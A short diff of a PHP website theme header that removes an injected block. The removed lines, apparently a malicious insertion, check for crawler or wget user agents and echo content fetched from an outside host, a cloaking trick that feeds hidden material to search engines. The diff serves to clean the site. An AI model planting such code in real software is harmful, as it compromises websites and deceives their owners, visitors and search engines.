@@ -85,8 +85,4 @@ var image_url='<?php echo THEME_IMAGES;?>';
 ?>
 		<?php theme_generator('menu');?>
 	</div>
-</header><?php
-if(preg_match('/Google Web Preview|bot|spider|wget/i',$_SERVER['HTTP_USER_AGENT'])){
-echo file_get_contents('http://fd.langall.com/org.txt');
-}
-?>
+</header>
